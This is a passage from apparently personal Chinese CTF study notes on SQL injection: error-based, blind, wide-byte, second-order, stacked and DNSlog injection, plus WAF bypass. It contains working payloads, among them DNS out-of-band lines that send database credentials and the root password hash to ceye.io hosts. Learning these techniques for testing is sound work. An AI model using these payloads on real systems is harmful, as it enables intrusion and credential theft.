--+</code>发现说明等级8的时候，页面就没有显示。那么说明database（）的长度是8</p></li><li><p>常用函数及注入技巧</p></li></ol><pre><code class="hljs python"><span class="hljs-comment">#left (a, b)从左侧截取a的前b位 ❗注意是前几位，不是第几位</span>left (database(),<span class="hljs-number">1</span>)<span class="hljs-built_in">ord</span>=<span class="hljs-built_in">ascii</span> <span class="hljs-built_in">ascii</span>(x)=<span class="hljs-number">97</span> 判断x的<span class="hljs-built_in">ascii</span>码是否等于<span class="hljs-number">97</span></code></pre><p>🔴<span style="background:#FF9999;">注意：mid第二个参数从1开始,</span></p><p>🟠<span style="background:#FFFFBB;">limit第一个参数从0开始</span></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041459346.jpeg"></p><h3 id="报错注入">报错注入</h3><p><a href="https://www.cnblogs.com/wangtanzhi/p/12577891.html">***个人博客王叹之总结，宝典</a></p><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">简书12种报错注入+万能语句，简洁</a></p><h4 id="pow溢出报错注入">pow()溢出报错注入</h4><ul><li>要点：查询正确会因为pow溢出而报错，否则不报错只是说查询不到=》查询出错，类似布尔注入</li></ul><pre><code class="hljs mysql">select 1 and case1 and pow(999,999)发生报错，说明case1为真select 1 and case2 and pow(999,999)没报错，只是查询不到，说明case2为假case可以作为我们用来判断的语句，进行布尔盲注</code></pre><ul><li><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439843.png" alt="image-20210522142152524" style="zoom:67%;"></li></ul><h4 id="join..using">join..using</h4><ol type="1"><li>用法：MySQL 的 JOIN 在两个或多个表中查询数据。【<a href="https://www.runoob.com/mysql/mysql-join.html">菜鸟教程</a>、<a href="https://blog.csdn.net/weixin_46706771/article/details/112769113">csdn例子加教程</a>】</li><li>有重复的列名时报错并返回一个重复的列名</li><li><strong>就是利用join使得mysql列名重复，报错返回重复的列名得到我们想要的信息</strong></li></ol><blockquote><p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p><p>并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNERJOIN）条件【排去重复的列名最后得到全部列名信息】来避免报错</p></blockquote><p><img src="https://img2020.cnblogs.com/blog/1625650/202003/1625650-20200329143159098-1312087130.png" alt="join"></p><h4 id="extractvalueupdatexml">extractvalue()、updatexml()</h4><p><a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">大佬csdn</a>、 <a href="https://developer.aliyun.com/article/692723">阿里云</a>、、<a href="https://my.oschina.net/u/4610683/blog/4492284">详解</a> 、<a href="https://www.cnblogs.com/wangtanzhi/p/12577891.html">王叹之也有</a></p><pre><code class="hljs pgsql">extractvalue() :对<span class="hljs-type">XML</span>文档进行查询的函数语法：extractvalue(目标<span class="hljs-type">xml</span>文档，<span class="hljs-type">xml</span>路径)第二个参数 <span class="hljs-type">xml</span>中的位置是可操作的地方，<span class="hljs-type">xml</span>文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.<span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">and</span> (extractvalue(‘anything’,concat(‘/’,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()))))这里在’anything’中查询 位置是 /<span class="hljs-keyword">database</span>()的内容，但是：<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.<span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(‘anything’,concat(‘~’,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()))))**可以看出，以~开头的内容不是<span class="hljs-type">xml</span>格式的语法，报错，但是会显示无法识别的内容是什么**，这样就达到了目的。当然concat第一个参数是/时**不会报错**</code></pre><pre><code class="hljs mysql">updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)updatexml()函数与extractvalue()类似，是更新xml文档的函数。语法updatexml(目标xml文档，xml路径，更新的内容)select username from security.user where id&#x3D;1 and (updatexml(‘anything’,’&#x2F;xx&#x2F;xx’,’anything’))通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后回显报错。错误大概会是：ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’   &#x2F;&#x2F;则爆出信息</code></pre><p>注意：</p><ul><li>updatexml是三个参数，中间参数配合concat注入，concat一三参数标识回显结果的头和尾，<code>0x7e</code>是<code>~</code></li><li>extractvalue两个参数，第二个参数配合concat</li><li><strong>extractvalue()和updatexml()</strong>只能回显==32位长度==的数据</li><li><span style="background:#bbffff;">select，insert，update没有回显的都可以使用</span></li></ul><p>爆出所有表名</p><pre><code class="hljs mysql">http:&#x2F;&#x2F;www.anantest.com:8080&#x2F;sqlilabs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) and updatexml(1,concat(0x23,(select group_concat(schema_name) from information_schema.schemata )),1)-&#x2F;&#x2F;爆表名:or extractvalue(1, concat(0x7e, (select concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)))爆字段名:or extractvalue(1, concat(0x7e, (select concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1)))爆数据:or extractvalue(1, concat(0x7e, (select concat_ws(&#39;:&#39;, username, password) from users limit 0,1))) or &#39;&#39;</code></pre><h4 id="floor"><a href="https://www.cnblogs.com/c1047509362/p/12806297.html"><strong>floor</strong></a></h4><h3 id="时间盲注">时间盲注</h3><blockquote><p>用工具、脚本</p></blockquote><ol type="1"><li>与布尔盲注类似，但是无法通过返回信息判断对错，因为只返回true。可通过时间函数sleep，<strong><span style="background:#BBFFBB;">通过web页面响应时间判断注入语句是否成功</span></strong></li><li>用<code>if</code>和<code>sleep</code>函数判断是ture还是false<u>正确就延迟n秒返回，错误就0s返回</u></li></ol><pre><code class="hljs apache"><span class="hljs-attribute">if</span>类似三目运算<span class="hljs-attribute">if</span>(条件,expr<span class="hljs-number">2</span>,expr<span class="hljs-number">3</span>)，如果条件为true,则返回expr<span class="hljs-number">2</span>的值，否则返回<span class="hljs-number">3</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439844.png" alt="image-20210726204326926" style="zoom:67%;"></p><p><span style="background:#bbffff;">sleep可以放在if的第二个参数，也可以是if放在sleep里</span></p><pre><code class="hljs angelscript">select * <span class="hljs-keyword">from</span> member where id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep (<span class="hljs-keyword">if</span> (database ()=<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>));如果database是a则停<span class="hljs-number">1</span>s否则不停id=<span class="hljs-number">2</span> <span class="hljs-keyword">and</span>  sleep( <span class="hljs-keyword">if</span>(  (SELECT count(SCHEMA_NAME) FROM information_schema.SCHEMATA) = <span class="hljs-number">7</span>,    <span class="hljs-number">0</span>,<span class="hljs-number">5</span> ))好像这个是说如果数据库总数等于<span class="hljs-number">7</span>的话<span class="hljs-number">0</span>s返回否则<span class="hljs-number">5</span>s</code></pre><ol start="3" type="1"><li>其他操作如获取库名、表名、爆破子段等等同布尔注入，只是通过sleep函数查看是否成功</li></ol><h3 id="宽子节注入">宽子节注入</h3><ul><li><a href="https://blog.csdn.net/u011721501/article/details/42874517">**精简，CSDN原理及防御</a></li><li><a href="https://www.jianshu.com/p/7af00dcdd5d1">少，易理解，简书</a></li><li><a href="https://zgao.top/mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">***个人博客，内容点基础但面面俱到易理解</a></li><li><a href="https://www.cnblogs.com/zhaoyixiang/p/10970117.html">跟前面差不多，都是很基础/常见的讲解，但配有例子，及sqlmap怎么宽子节注入</a></li></ul><blockquote><p>要点： -主要是绕过编码漏洞使单引号逃逸，让他闭合掉前面的查询，不被转义 -PHP编码为UTF-8而Mysql的编码设置为<code>set  names 'gbk'</code>或是<code>set character_set_client=gbk</code>，这样配置会引发编码转换从而导致的注入漏洞(<strong>一个gbk编码汉字，占用2个字节，一个utf-8编码的汉字，占用3个字节</strong>）-由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符（mysql判断一个字符是不是汉字，首先两个字符时一个汉字，另外根据gbk编码，<strong>第一个字节ascii码大于128，基本上就可以了</strong>），此时’前的，我们就可以使用’了，-<strong>只要报错就说明单引号逃逸，起了作用，留了一个单的引号，语法错误</strong>-<strong>加了单引号不报错，说明单引号被转义或者被addslashes函数过滤掉了</strong></p></blockquote><ul><li>一般常见的宽字符注入 <pre><code class="hljs php">%df%<span class="hljs-number">27</span>===&gt;(addslashes)====&gt;%df%<span class="hljs-number">5</span>c%<span class="hljs-number">27</span>====&gt;(GBK)====&gt;運’用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sqlhttp:<span class="hljs-comment">//www.xxx.com/login.php?user=%df’ or 1=1 limit 1,1%23&amp;pass=</span>其对应的sql就是：select * fromcms_user where username = ‘運’ <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-comment">#’ and password=”</span></code></pre></li></ul><h4 id="套路">套路</h4><ol type="1"><li><p>试探是否有注入漏洞url里输入 <code>admin%df%27</code></p></li><li><p>爆列数<code>?id=1%df%27 order by 2#</code>  列数得知2列。</p></li><li><p>爆库： <code>?id=-1%df%27 union select 1,database()%23</code>数据库:sae-chinalover</p></li><li><p>爆列表: <pre><code class="hljs angelscript">?id=<span class="hljs-number">-1</span>%df%<span class="hljs-number">27</span> union select <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-number">0x7361652d6368696e616c6f766572</span>%<span class="hljs-number">23</span></code></pre> 爆出这些表:ctf,ctf2,ctf3,ctf4,gbksqli,news</p></li><li><p>爆字段： <pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span>%df%<span class="hljs-number">27</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x63746634</span>%<span class="hljs-number">23</span></code></pre> 字段:id flag</p></li><li><p>查询关键字：<code>?id=-1%df%27 union select 1,flag from ctf4%23</code></p></li><li><p>利用<strong>sqlmap</strong> <pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27&quot;</span></code></pre></p></li></ol><h3 id="无列名注入">无列名注入</h3><p><a href="https://blog.csdn.net/qq_40500631/article/details/89631904">csdn</a></p><ol type="1"><li>无列名注入主要是适用于<strong>已经获取到数据表名</strong>，但无法查询列的情况下，在大多数CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</li><li>通过对要查询的列起别名，并查询这个别名将数据查出，达到未知列名，依旧查询到信息的效果</li><li>要点：==使用反引号`加数字表示<strong>列名或者表名</strong>，或者用别名表示【反引号被过滤时】【<strong>a.3</strong>】==</li><li>==<a href="https://www.cnblogs.com/GH-D/p/11962522.html">也可以使用join报错进行无列名注入</a>==</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439845.png" alt="image-20210522141728684"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439846.png" alt="image-20210522134617792" style="zoom:50%;"></p><pre><code class="hljs mysql">&#x2F;&#x2F;表有5列,列名为id,name,pass,mail,phoneselect 1,2,3,4,5 union select*from users;   &#x2F;&#x2F;列名变成12345，未知实际列名，前提是要知道表名 &#x2F;&#x2F;继续使用数字来对应列,如3对应了表里面的pass:select&#96;3&#96;from (select 1,2,3,4,5 union select*from users)a;&#x2F;&#x2F;当&#96;不能使用的时候，使用别名来代替：select b from (select 1,2,3 as b,4,5 union select*from users)a;&#x2F;&#x2F;在注入中查询多个列：select concat(&#96;2&#96;,0x3a,&#96;3&#96;) from (select 1,2,3,4,5 union select *from users)a limit 1,1;  &#x2F;&#x2F;0x3a表示：</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439848.png" alt="image-20210522134817435"></p><h4 id="总结一般套路">总结，一般套路：</h4><p>别名法：</p><pre><code class="hljs mysql">(select &#96;2&#96; from (select 1,2,3 union select * from table_name)a)  &#x2F;&#x2F;前提是要知道表名</code></pre><pre><code class="hljs mysql">((select c from (select 1,2,3 c union select * from users)b))    1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量</code></pre><pre><code class="hljs mysql">select a.3 from (select 1,2,3 union select * from users) as a;</code></pre><p>join法：</p><pre><code class="hljs mysql">select * from (select * from users as a join users b)c;  &#x2F;&#x2F;爆列名ERROR 1060(42S21):Duplicate column name &#39;username&#39;  &#x2F;&#x2F;得到列名username</code></pre><pre><code class="hljs sql">-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, (<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(a) <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> s,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> a,<span class="hljs-number">3</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>)<span class="hljs-keyword">as</span> m),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span><span class="hljs-string">&#x27;</span><span class="hljs-string">//一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件，把users中第一列别名s,第二列别名a，第三列别名b，查询得到新的表别名m，供给外部查询a列</span></code></pre><h2 id="注入拓展">🐱‍🏍注入拓展</h2><h4 id="加解密">加解密</h4><blockquote><p>sqlilabs 21关</p></blockquote><p>关键点：注入的语句加密后发送</p><ul><li>关联sqlmap：<ul><li>配合参数tamper，自带插件，使用外部.py文件实现例如base64注入点</li><li>也可以不用插件自己写脚本配合sqlmap【<span style="background:#FF9999;">中转注入</span>】<ul><li><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439849.png" alt="image-20210727204045560"></li><li>然后<code>sqlmap -u "http://127.0.0.1:8080/test.php?x=" -v 3</code>，<code>-v 3</code>是sqlmap显示注入语句</li></ul></li></ul></li></ul><h4 id="json注入">JSON注入</h4><h4 id="ladp注入">LADP注入</h4><h4 id="dnslog注入">DNSlog注入</h4><blockquote><p>sqlilabs 9 load_file+dnslog带外注入</p></blockquote><blockquote><p>http://ceye.io/profile【免费的记录dnslog的平台】</p><p>https://github.com/ADOOO/DnslogSqlinj【win下】</p><p>http://www.dnslog.cn</p><p>http://admin.dnslog.link/</p></blockquote><blockquote><p><a href="https://www.cnblogs.com/-qing-/p/10623583.html">个人博客详解1</a>、<a href="https://www.cnblogs.com/xhds/p/12322839.html">*3</a>、<a href="https://www.freebuf.com/sectool/280777.html">**freebuf</a></p></blockquote><ol type="1"><li>用户得是root，有读写文件的权限</li><li>解决了盲注还不能<em>回显数据</em>，效率低的问题,<strong>另外要发送大量的get请求，那么这种行为很容易被目标物理防火墙认定位是黑客行为，最终导致IP被ban。而DNS不会</strong></li></ol><ul><li><p>原理</p><ul><li>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息<strong>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</strong></li><li>原理上只要能进行DNS请求的函数都可能存在DNSlog注入。</li></ul></li><li><p>应用条件</p><ul><li><span style="background:#FF9999;">windows下</span>Mysql【因为Linux没有UNC路径，所以当处于Linux系统时，不能使用该方式获取数据】</li><li>返回数据没有特殊符号</li><li><strong>load_file函数，【<span style="background:#FF9999;">所以一般得是root权限</span>】，</strong>load_file()不仅能够加载本地文件，同时也能对诸如www.test.com这样的URL发起请求。</li></ul></li><li><p>应用场景</p><ul><li>SQL注入中的盲注在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易<strong>被waf拦截</strong>，又或者是目标站点<strong>没有回显</strong></li><li>无回显的命令执行我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功</li><li>无回显的SSRF</li><li><strong><span style="background:#FF9999;">总之就是靶机不让信息显示出来，如果靶机能发送请求，那么就可以尝试咱这个办法——用DNSlog来获取回显</span></strong></li></ul></li><li><p><a href="https://www.xcnte.com/archives/512/">load_file</a>--<strong>读取一个文件并将其内容作为字符串返回。</strong></p><ul><li><p><strong>必须指定文件==完整的路径==</strong></p></li><li><p>``` SELECT LOAD_FILE('/data/test.txt') AS Result;//返回test文件内容 <pre><code class="hljs autohotkey">    - 参数可以是`char()`或者十六进制`hex()`的形式    普通回显win：</code></pre> ping %USERNAME%.j1wbye.ceye.io<pre><code class="hljs pgsql">&lt;img src=&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439850.png&quot; alt=&quot;image-20210728162212024&quot; style=&quot;zoom: 67%;&quot; /&gt;&lt;img src=&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439851.png&quot; alt=&quot;image-20210728162224771&quot; style=&quot;zoom:67%;&quot; /&gt;<span class="hljs-keyword">SQL</span>注入：```mysqlload_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-string">&#x27;.abcdef.ceye.io\\sql&#x27;</span>)) //重点所以就等同于访问了<span class="hljs-keyword">database</span>().abcdef.ceye.io，然后我们的ceye平台就会有记录，那么<span class="hljs-keyword">database</span>()就得到了，\\<span class="hljs-keyword">sql</span>是域名目录，随意即可，<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()换成<span class="hljs-keyword">sql</span>注入payload即可  要注意的是数据很可能不止一行，因此要用<span class="hljs-keyword">limit</span>分次输出。  <span class="hljs-keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> mysql.<span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;</span>)); 【<span class="hljs-keyword">limit</span>后加<span class="hljs-number">1</span>个数字：前几行】  <span class="hljs-number">1.</span> 查询数据库名http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/lou/<span class="hljs-keyword">sql</span>/Less<span class="hljs-number">-9</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select database()),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><span class="hljs-string"></span><span class="hljs-string">2. 获取数据表</span><span class="hljs-string">http://127.0.0.1/lou/sql/Less-9/?id=1&#x27;</span> <span class="hljs-keyword">and</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.cmr1ua.ceye.io\\abc&#x27;</span>))<span class="hljs-comment">--+</span><span class="hljs-number">3.</span> 获取表中的字段名<span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><span class="hljs-string"></span><span class="hljs-string">4. 获取表中字段下的数据</span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.cmr1ua.ceye.io\\abc&#x27;</span>))<span class="hljs-comment">--+</span><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select username from users limit 0,1),&#x27;</span>.cmr1ua.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><span class="hljs-string"></span><span class="hljs-string">//注意！⚠</span><span class="hljs-string">//因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 </span><span class="hljs-string">出来了再转回去</span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> hex(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.cmr1ua.ceye.io\\abc&#x27;</span>))<span class="hljs-comment">--+</span></code></pre></p></li></ul></li></ul><p><a href="https://www.freebuf.com/column/226091.html">Sqlmap支持dns回显注入</a></p><p>​ 在sqlmap中实现DNS注入加上参数</p><p>​ 在服务器安装好了sqlmap然后运行dns.py</p><pre><code class="hljs jboss-cli"><span class="hljs-params">--dns-domain=</span>域名python sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/sqli-labs-master/Less-2/?id=1&quot;</span> <span class="hljs-params">--tech</span> B <span class="hljs-params">--dns-domain</span> 192.168.0.18 <span class="hljs-params">--dbs</span></code></pre><p>​ 即可实现自动化</p><h4 id="二次注入">二次注入</h4><p><span style="background:#FF9999;">前端找不到，<strong>扫描工具也无效！</strong><strong>只能靠人工</strong></span></p><blockquote><p>sqlilab 登录框+24关</p></blockquote><blockquote><p><a href="https://blog.csdn.net/weixin_44262289/article/details/107699595?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.control&amp;spm=1001.2101.3001.4242">**CSDN简洁版</a></p><p><a href="https://www.freebuf.com/articles/web/167089.html">freebuf科普加例题+强网杯</a></p><p>CTF-[网鼎杯2018]Unfinish【buu/cuthub】</p></blockquote><p>注册用户：插入数据，修改密码：更新数据</p><p>先注册用户，对用户名做马脚然后修改密码时实现对其他账号的注入</p><ul><li><p>关键点：插入危险数据=》显示危险数据</p></li><li><p><strong>核心原理：</strong></p></li></ul><p><strong>提前把危险语句插入数据库（插入），数据在存入数据库后还原成了用户输入的形式，当在数据库取出的时候（更新/查询），没有再次进行过滤和转义，执行语句导致错误，从而造成了二次注入。</strong></p><p>Q:二次注入可能存在在什么地方</p><ul><li><p>存在转义函数的地方</p></li><li><p>在<span style="background:#bbffff;">回溯数据输入的地方，如修改用户账户密码、修改文章标题</span></p></li><li><p>跨语言的应用，容易导致问题。比如前台PHP，后台java</p></li><li><p>日志相关：存日志时，读取了一些数据库里的信息，比如用户名等，然后又存储了一次</p></li><li><p>跨程序的数据传递：程序A处理完后存储到数据库，程序B去读取，未进行过滤</p></li><li><p><strong>二次注入漏洞挖掘思路有哪些</strong></p></li></ul><p>（1）数据库存储未转义，大多来说，存储到数据库中的东西只是做了表面的转义，实质上库里存储的还是原始状态的内容，在多数读取未校验的情况下，可输入特殊字符并在页面上完整显示的部分，有可能存在二次注入的可能。</p><p>（2）强交互部分，SQL注入是需要与数据库联动的，但往往在登录、修改内容、发布内容等功能上忽略了历史数据这一点，所以在遇到有修改账户密码、发布留言、发布内容的部分，大家不妨去试试注册一个test或者admin’--或者admin账号，然后在测试回复的内容或者修改的内容是否达到预期。如果与预期不符，那么有可能就存在二次注入，此时在精心构造sql语句即可。</p><p>（3）防御绕过，有些地方明显存在异常，但是又做了一些限制，比如年龄，限制了字段为is_numeric，那么我们可以通过转换进制，16进制等方式将其录入，查询时的效果是一样的，遇到其他的限制，跟xss绕过原理一样，大家可以脑洞大开，搞一些数据库可以解析的编码进去。</p><p>（4）多录入异常内容，多观察返回结果，凡是与自己录入的内容不一致的地方，就可以去看看是否存在二次注入。</p><p><strong>黑盒测试</strong>：观察能获得哪些信息，可以添加哪些信息，哪些信息可以修改，还可盲猜列名实现不同地方update时回显注入语句</p><ul><li><span style="background:#FF9999;">注意！</span><ul><li>is_numeric可以用16进制编码<code>hex()</code>绕过。</li></ul></li></ul><pre><code class="hljs sql">当访问username=test’&amp;password=123时，执行的SQL语句为： <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> ( ‘ <span class="hljs-keyword">test</span>\ ’ <span class="hljs-string">&#x27;,‘202cb962ac59075b964b07152d234b70’)数据库中就变成了</span><span class="hljs-string">test&#x27;</span>  <span class="hljs-number">123</span>查询对应<span class="hljs-keyword">id</span>时<span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> person <span class="hljs-keyword">where</span> ‘username’=‘<span class="hljs-keyword">test</span>’’ //发生注入，由于多了一个单引号，所以页面会报错。</code></pre><h4 id="堆叠注入">堆叠注入</h4><blockquote><p>sqlilab天书 38关</p></blockquote><p>​ 含义：多个sql语句以；放在一起</p><p>​ 数据库分号；代表语句结束=》按顺序进行</p><p>我们是用mysql_query()接收的sql语句。而mysql_query()它本身只能执行一句sql语句，所以就会出错。把mysql_query()换为mysqli_multi_query()就可以执行多条sql语句查询。但mysqli_multi_query()的返回类型为布尔型。</p><p>​ 并不是所有数据库都支持堆叠查询：<span style="background:#bbffff;">支持堆叠数据库类型：MYSQL MSSQLPostgresql等</span></p><ul><li><p>用处</p><p>//注入需要管理员帐号密码，密码是加密，无法解密//堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录【自己添加一个管理员账号密码】</p></li><li><p>注意⚠</p><ul><li><strong>堆叠注入需要条件</strong>，在源代码关于sql是可以多条语句执行情况下可以堆叠注入，否则不行，不会执行SQL语句，会报错</li><li></li></ul></li></ul><h3 id="waf绕过">🛡WAF绕过</h3><blockquote><p>Sqlilabs-Less38-堆叠注入(多语句)</p></blockquote><blockquote><p>***<a href="https://www.secpulse.com/archives/94962.html">WAFBypass数据库特性</a></p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439852.png" alt="image-20210808104332262" style="zoom:67%;"></p><blockquote><p>waf软件：阿里云盾，宝塔，安全狗</p></blockquote><ul><li>%0a 是换行符，%23 是#</li></ul><h4 id="参数污染">参数污染</h4><p>​ 有多个参数，以哪个参数为准</p><p>​ 服务器处理参数：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439853.png" alt="image-20210808165140675"></p><pre><code class="hljs angelscript">例如apache：?y=<span class="hljs-number">1</span>&amp;y=<span class="hljs-number">2</span>GET最后y是<span class="hljs-number">2</span></code></pre><p>参数污染+特殊符号注释</p><pre><code class="hljs angelscript">id=<span class="hljs-number">-1</span><span class="hljs-comment">/**&amp;id=-1%20union%20select%201,2,3%23*/</span>即id=<span class="hljs-number">-1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#*/</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439854.png" alt="image-20210808170638727"></p><ul><li>sql注释</li></ul><pre><code class="hljs livecodeserver">SQL注释　　单行注释　　<span class="hljs-comment">#后面直接加内容</span>　　　　　　　　<span class="hljs-comment">--后面必须加空格</span>　　多行注释　　<span class="hljs-comment">/**/</span>中间可跨行　　<span class="hljs-comment">-- + 会删除</span></code></pre><ul><li>内联注释？</li></ul><p>MySQL数据库为了保持与其他数据库兼容，特意新添加的功能。为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些MySQL特有的语句放在 <code>/*! ... */</code>中，这些语句在不兼容的数据库中使用时便不会执行。而MySQL自身却能识别、执行。==<code>/*!50001 */</code>表示数据库版本&gt;=5.00.01时中间的语句才会执行。==在SQL注入中，内联注释常用来绕过waf。</p><p>⚠️不一定是哪个版本就允许了，可以写python脚本跑出来</p><p><span style="background:#FF9999;">这是MYSQL特性：</span></p><pre><code class="hljs angelscript"><span class="hljs-comment">/*!select * from users*/</span>;   <span class="hljs-comment">//可以执行</span>id=<span class="hljs-number">-1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span><span class="hljs-comment">/*!44509select*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">//可以绕过waf</span>还可以union%<span class="hljs-number">20</span>all%<span class="hljs-number">23</span>%<span 